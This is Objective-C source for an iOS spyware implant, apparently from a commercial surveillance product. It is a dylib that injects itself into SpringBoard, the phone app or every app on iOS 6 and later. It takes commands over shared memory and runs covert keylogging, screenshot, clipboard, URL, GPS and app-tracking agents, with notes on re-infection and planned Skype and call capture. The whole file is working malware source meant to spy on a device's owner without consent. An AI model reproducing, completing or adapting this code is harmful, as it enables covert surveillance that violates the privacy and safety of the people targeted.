/*
 * RCSiOS - dylib loader for process infection
 *  pon pon 
 *
 * [QUICK TODO]
 * - Cocoa Keylogger
 * - Cocoa Mouse logger
 * - URLGrabber
 *   - Safari
 * - IM (Skype/Nimbuzz/...)
 *   - Text
 *   - Call
 * - MobilePhone
 *
 *
 * Created on 07/09/2009
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */
#import <UIKit/UIApplication.h>
#import <objc/runtime.h>
#import <unistd.h>
#import <dlfcn.h>
#import <fcntl.h>
#import <sys/mman.h>
#import <AudioToolbox/AudioToolbox.h>

#import "RCSIDylib.h"
#import "RCSISharedMemory.h"
#import "RCSIDylibEvents.h"
#import "RCSIEventStandBy.h"
#import "RCSIAgentApplication.h"
#import "RCSIAgentInputLogger.h"
#import "RCSIAgentScreenshot.h"
#import "RCSIAgentURL.h"
#import "RCSIAgentPasteboard.h"
#import "RCSIAgentGPS.h"

#import "ARMHooker.h"

//#define DEBUG
//#define __DEBUG_IOS_DYLIB

#define CAMERA_APP    @"com.apple.camera"
#define CAMERA_APP_40 @"com.apple.mobileslideshow"
#define DYLIB_MODULE_RUNNING 1
#define DYLIB_MODULE_STOPPED 0

static BOOL gInitAlreadyRunned = FALSE;
static char gDylibPath[256];

BOOL gIsAppInForeground = TRUE;

// OS version
u_int gOSMajor  = 0;
u_int gOSMinor  = 0;
u_int gOSBugFix = 0;

NSString *gBundleIdentifier = nil;

#ifdef __DEBUG_IOS_DYLIB
/*
 * -- only for debugging purpose
 */

void catch_me();
/*
 * --
 */
#endif

void init(void);
void checkInit(char *dylibName);
BOOL threadIt(void);

static void TurnWifiOn(CFNotificationCenterRef center, 
                       void *observer,
                       CFStringRef name, 
                       const void *object,
                       CFDictionaryRef userInfo)
{ 
  Class wifiManager = objc_getClass("SBWiFiManager");
  id antani = nil; 
  antani = [wifiManager performSelector: @selector(sharedInstance)];
  //[antani setWiFiEnabled: YES];
}

static void TurnWifiOff(CFNotificationCenterRef center, 
                        void *observer,
                        CFStringRef name, 
                        const void *object,
                        CFDictionaryRef userInfo)
{ 
  Class wifiManager = objc_getClass("SBWiFiManager");
  id antani = nil;
  antani = [wifiManager performSelector: @selector(sharedInstance)];
  //[antani setWiFiEnabled: NO];
}

void getSystemVersion(u_int *major,
                      u_int *minor,
                      u_int *bugFix)
{
  NSString *currSysVer = [[UIDevice currentDevice] systemVersion];
  
  if ([currSysVer rangeOfString: @"."].location != NSNotFound)
  {
    NSArray *versions = [currSysVer componentsSeparatedByString: @"."];
    
    if ([versions count] > 2)
    {
      *bugFix = (u_int)[[versions objectAtIndex: 2] intValue];
    }
    
    *major  = (u_int)[[versions objectAtIndex: 0] intValue];
    *minor  = (u_int)[[versions objectAtIndex: 1] intValue];
  }
  else
  {
#ifdef DEBUG
    NSLog(@"Error on sys ver (dot not found in string: %@)", currSysVer);
#endif
  }
}

#pragma mark -
#pragma mark - entry point
#pragma mark -

BOOL threadIt(void)
{
  gBundleIdentifier  = [[[NSBundle mainBundle] bundleIdentifier] retain];
  
  /*
   * On iOS 6.x.x we inject in all apps
   */
  if (gOSMajor >= 6)
    return TRUE;
  
  if ([gBundleIdentifier compare: SPRINGBOARD] == NSOrderedSame ||
      [gBundleIdentifier compare: MOBILEPHONE] == NSOrderedSame)
    return TRUE;
  else
    return FALSE;
}

/*
 * dylib entry point
 */
void init(void)
{
  NSAutoreleasePool *pool     = [[NSAutoreleasePool alloc] init];
  
  gInitAlreadyRunned = TRUE;
  
  getSystemVersion(&gOSMajor, &gOSMinor, &gOSBugFix);
  
  dylibModule *dyilbMod = [[dylibModule alloc] init];

#ifdef __DEBUG_IOS_DYLIB
  /*
   * -- only for debugging purpose
   */
    catch_me();
    [NSThread detachNewThreadSelector: @selector(dylibMainRunLoop)
                             toTarget: dyilbMod
                           withObject: nil];
  /*
   * --
   */
#else
  
  if (threadIt() == TRUE)
    {
      [dyilbMod threadDylibMainRunLoop];
    }
  else
    {
      [[NSNotificationCenter defaultCenter] addObserver: dyilbMod
                                               selector: @selector(threadDylibMainRunLoop)
                                                   name: UIApplicationDidFinishLaunchingNotification
                                                 object: nil];
    }
#endif
  
  [pool drain];
}

/*
 * runned by injected thread for SB re-infection
 */
__attribute__((visibility("default"))) void checkInit(char *dylibName)
{
  if (dylibName != NULL)
    snprintf(gDylibPath, sizeof(gDylibPath), "%s", dylibName);

  usleep(1500);
  
  if (gInitAlreadyRunned == FALSE)
    {
      init();
    }
}

#ifdef __DEBUG_IOS_DYLIB
/*
 * -- only for debugging purpose
 */

void catch_me()
{
  int i = 0;
  i++;
  return;
}

/*
 * --
 */
#endif

@implementation dylibModule

@synthesize mAgentsArray;
@synthesize mEventsArray;
@synthesize mConfigId;

#pragma mark -
#pragma mark - initialization 
#pragma mark -

- (id)init
{
  self = [super init];
  
  if (self != nil)
    {
      mEventsArray = [[NSMutableArray alloc] initWithCapacity:0];
      mAgentsArray = [[NSMutableArray alloc] initWithCapacity:0];
      mConfigId          = 0;
      mMainThreadRunning = TRUE;
      mDylibName         = nil;
    }
  
  return self;
}

#pragma mark -
#pragma mark - Notification 
#pragma mark -

- (void)sendNeedConfigRefresh
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  NSMutableData *theData = [[NSMutableData alloc] initWithLength: sizeof(shMemoryLog)];
  shMemoryLog *shMemoryHeader = (shMemoryLog *)[theData bytes];
  
  shMemoryHeader->status          = SHMEM_WRITTEN;
  shMemoryHeader->logID           = 0;
  shMemoryHeader->agentID         = DYLIB_CONF_REFRESH;
  shMemoryHeader->direction       = D_TO_CORE;
  shMemoryHeader->commandType     = CM_LOG_DATA;
  shMemoryHeader->flag            = getpid();
  shMemoryHeader->commandDataSize = 0;
  shMemoryHeader->timestamp       = 0;
  
  [[_i_SharedMemory sharedInstance] writeIpcBlob: theData];
  
  [theData release];
  
  [pool release];
  
}

+ (void)triggerCamera:(UInt32)startStop
{  
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  NSMutableData *theData = [[NSMutableData alloc] initWithLength: sizeof(shMemoryLog)];
  shMemoryLog *shMemoryHeader = (shMemoryLog *)[theData bytes];
  
  shMemoryHeader->status          = SHMEM_WRITTEN;
  shMemoryHeader->logID           = 0;
  shMemoryHeader->agentID         = EVENT_CAMERA_APP;
  shMemoryHeader->direction       = D_TO_CORE;
  shMemoryHeader->commandType     = CM_LOG_DATA;
  shMemoryHeader->flag            = startStop;
  shMemoryHeader->commandDataSize = 0;
  shMemoryHeader->timestamp       = 0;
  
  [[_i_SharedMemory sharedInstance] writeIpcBlob: theData];
  
  [theData release];
  
  [pool release];
}

- (void)sendAsyncBgNotification
{
  NSString *execName = [[NSBundle mainBundle] bundleIdentifier];
  
  if ([execName compare: CAMERA_APP] == NSOrderedSame ||
      [execName compare: CAMERA_APP_40] == NSOrderedSame)
    {
    [dylibModule triggerCamera:2];
    }
}

- (void)sendAsyncFgNotification
{
  NSString *execName = [[NSBundle mainBundle] bundleIdentifier];
  
  if ([execName compare: CAMERA_APP] == NSOrderedSame ||
      [execName compare: CAMERA_APP_40] == NSOrderedSame)
    {
    [dylibModule triggerCamera:1];
    }
}

- (void)sendAsyncInitNotification
{
  [self sendAsyncFgNotification];
}

- (void)dylibApplicationWillEnterForeground
{
  gIsAppInForeground = TRUE;
  
  [self sendAsyncFgNotification];
  [self sendNeedConfigRefresh];
}

- (void)dylibApplicationWillEnterBackground
{
  gIsAppInForeground = FALSE;
  
  [self sendAsyncBgNotification];
}

- (void)registerAppNotification
{
  [[NSNotificationCenter defaultCenter] addObserver: self
                                           selector: @selector(dylibApplicationWillEnterForeground)
                                               name: @"UIApplicationWillEnterForegroundNotification"
                                             object: nil];
  
  [[NSNotificationCenter defaultCenter] addObserver: self
                                           selector: @selector(dylibApplicationWillEnterBackground)
                                               name: @"UIApplicationDidEnterBackgroundNotification"
                                             object: nil];  
  // only for 4.0
  [[NSNotificationCenter defaultCenter] addObserver: self
                                           selector: @selector(dylibApplicationWillEnterBackground)
                                               name: @"UIApplicationWillTerminateNotification"
                                             object: nil];
  // Install a callback in order to be able to force wifi on and off
  // before/after syncing
  //  CFNotificationCenterAddObserver(CFNotificationCenterGetDarwinNotifyCenter(),
  //                                  NULL,
  //                                  &TurnWifiOn,
  //                                  CFSTR("com.apple.Preferences.WiFiOn"),
  //                                  NULL, 
  //                                  CFNotificationSuspensionBehaviorCoalesce); 
  //  
  //  CFNotificationCenterAddObserver(CFNotificationCenterGetDarwinNotifyCenter(),
  //                                  NULL,
  //                                  &TurnWifiOff,
  //                                  CFSTR("com.apple.Preferences.WiFiOff"),
  //                                  NULL, 
  //                                  CFNotificationSuspensionBehaviorCoalesce);
}

#pragma mark -
#pragma mark - Event management 
#pragma mark -

- (dylibEvents*)eventAllocate:(_i_DylibBlob*)aBlob
{
  dylibEvents *event = nil;
  
  switch ([aBlob type]) 
  {
    case EVENT_STANDBY:
      event = [[eventStandBy alloc] init];
    break;
  }
  return event;
}

- (dylibEvents*)getEventFromBlob:(_i_DylibBlob*)aBlob
{
  dylibEvents *event = nil;
  
  uint eventId = [aBlob type];
  
  for (int i=0; i < [mEventsArray count]; i++) 
    {
      id eventTmp = [mEventsArray objectAtIndex:i];
      if (eventId == [eventTmp mEventID])
        {
          event = eventTmp;
          break;
        }
    }
  
  if (event == nil)
    {
      event = [self eventAllocate:aBlob];
      [mEventsArray addObject:event];
    }
  
  return event;
}

- (void)stopAllEvents
{
  for (int i=0; i < [mEventsArray count]; i++) 
    {
      dylibEvents *eventTmp = [mEventsArray objectAtIndex:i];
      [eventTmp stop];
    }
}

- (void)startEvent:(_i_DylibBlob*)aBlob
{
  dylibEvents *event = [self getEventFromBlob:aBlob];
  [event start];
}

- (void)stopEvent:(_i_DylibBlob*)aBlob
{
  dylibEvents *event = [self getEventFromBlob:aBlob];
  [event stop];
}

#pragma mark -
#pragma mark - Agents management 
#pragma mark -

- (NSData*)getConfigData:(_i_DylibBlob*)aBlob
{
  NSData *retData = nil;
  
  blob_t *tmpBlob = (blob_t*)[[aBlob blob] bytes];
  
  if (tmpBlob->size > 0)
  retData = [NSData dataWithBytes:tmpBlob->blob length: tmpBlob->size];
  
  return retData;
}

- (_i_Agent*)agentAllocate:(_i_DylibBlob*)aBlob
{
  _i_Agent *agent = nil;
  
  switch ([aBlob type]) 
  {
    case AGENT_URL:
    { 
      agent = [[agentURL alloc] init];
      break;
    }
    case AGENT_APPLICATION:
    { 
      agent = [[agentApplication alloc] init];
      break;
    }case AGENT_KEYLOG:
    {
      agent = [[agentKeylog alloc] init];
    break;
    }
    case AGENT_CLIPBOARD:
    {
      agent = [[agentPasteboard alloc] init];
      break;
    }
    case AGENT_SCREENSHOT:
    {
      agent = [[agentScreenshot alloc] init];
      break;
    }
    case AGENT_POSITION:
    {
      agent = [[agentPosition alloc] initWithConfigData:[self getConfigData:aBlob]];
      break;
    }
  }
  return agent;
}

- (_i_Agent*)getAgentFromBlob:(_i_DylibBlob*)aBlob
{
  _i_Agent *agent = nil;
  
  uint agentId = [aBlob type];
  
  for (int i=0; i < [mAgentsArray count]; i++) 
    {
      id agentTmp = [mAgentsArray objectAtIndex:i];
      
      if (agentId == [agentTmp mAgentID])
        {
          agent = agentTmp;
          NSData *tmpConfigData = [self getConfigData: aBlob];
          [agent setMAgentConfiguration: tmpConfigData];
          break;
        }
    }
  
  if (agent == nil)
    {
      agent = [self agentAllocate:aBlob];
      [mAgentsArray addObject:agent];
    }
  
  return agent;
}

- (void)stopAllAgents
{
  for (int i=0; i < [mAgentsArray count]; i++) 
    {
      _i_Agent *agentTmp = [mAgentsArray objectAtIndex:i];
      [agentTmp stop];
    }
}

- (void)startAgent:(_i_DylibBlob*)aBlob
{
  _i_Agent *agent = [self getAgentFromBlob:aBlob];
  [agent start];
}

- (void)stopAgent:(_i_DylibBlob*)aBlob
{
  _i_Agent *agent = [self getAgentFromBlob:aBlob];
  [agent stop];
}

- (void)setDylibName:(_i_DylibBlob*)aBlob
{
  blob_t *_Blob = (blob_t*)[[aBlob blob] bytes];
  
  if (_Blob->size > 0)
    mDylibName = [[NSString alloc] initWithCString:_Blob->blob 
                                          encoding:NSUTF8StringEncoding];
}

#pragma mark -
#pragma mark - Blobs management 
#pragma mark -

- (void)checkAndUpdateConfigId:(_i_DylibBlob*)aBlob
{
  if ([aBlob configId] > mConfigId)
    {
      mConfigId = [aBlob configId];
      [self stopAllEvents];
      [self stopAllAgents];
    }
}

- (void)doit:(_i_DylibBlob*)aBlob
{
  switch ([aBlob type]) 
  {
    case AGENT_SCREENSHOT:
    case AGENT_URL:
    case AGENT_APPLICATION:
    case AGENT_KEYLOG:
    case AGENT_CLIPBOARD:
    case AGENT_POSITION:
      if ([aBlob getAttribute: DYLIB_AGENT_START_ATTRIB] == TRUE)
          [self startAgent: aBlob];
      else
          [self stopAgent: aBlob];
    break;
    case EVENT_STANDBY:
      if ([aBlob getAttribute: DYLIB_EVENT_START_ATTRIB] == TRUE)
        [self startEvent: aBlob];
      else
        [self stopEvent: aBlob];
    break;
    case DYLIB_NEED_UNINSTALL:
      mMainThreadRunning = DYLIB_MODULE_STOPPED;
      [self setDylibName:aBlob];
    break;
  }
}

- (void)processIncomingBlobs
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  NSMutableArray *blobs = [[_i_SharedMemory sharedInstance] getBlobs];
  id blob = nil;
  
  for (int i=0; i < [blobs count]; i++) 
    {
      blob = [blobs objectAtIndex:i];
      if (blob != nil)
        {
          [self checkAndUpdateConfigId:blob];
          [self doit:blob];
        }
    }
  [pool release];
}

#pragma mark -
#pragma mark - runloop 
#pragma mark -

- (void)checkDylibFile
{  
  if (mDylibName != nil)
    {
     if ([[NSFileManager defaultManager] fileExistsAtPath:mDylibName] == FALSE)
       mMainThreadRunning = DYLIB_MODULE_STOPPED;
    }
  else
    {
      if (strlen(gDylibPath))
        {
          mDylibName = [[NSString alloc] initWithBytes: gDylibPath 
                                                length:strlen(gDylibPath) 
                                              encoding:NSUTF8StringEncoding];
        }
    }
}

- (void)dylibMainRunLoop;
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  _i_SharedMemory *sharedMem = [_i_SharedMemory sharedInstance];
  
  if ([sharedMem createDylibRLSource] != kRCS_SUCCESS)
    return;
    
  /*
   * camera app, etc.
   */
  [self registerAppNotification];
  [self sendAsyncInitNotification];
  
  do 
    {
      NSAutoreleasePool *inner = [[NSAutoreleasePool alloc] init];
    
      [[NSRunLoop currentRunLoop] runUntilDate: [NSDate dateWithTimeIntervalSinceNow:1.00]];
    
      [self processIncomingBlobs];
    
      [self checkDylibFile];
    
      [inner release];
    }
  while (mMainThreadRunning == DYLIB_MODULE_RUNNING); 
  
  /*
   *  stop all agents, close all ipc ports etc...
   */  
  unsetenv("DYLD_INSERT_LIBRARIES");
  
  [self stopAllAgents];
  [self stopAllEvents];
  
  sleep(1);
  
  [sharedMem removeDylibRLSource];
  
  gInitAlreadyRunned = FALSE;
  
  [pool release];
}

/*
 * notify by UIApplicationDidFinishLaunchingNotification 
 * (only for app launched by SB)
 */
- (void)threadDylibMainRunLoop
{
  [NSThread detachNewThreadSelector: @selector(dylibMainRunLoop)
                           toTarget: self
                         withObject: nil];
}

@end
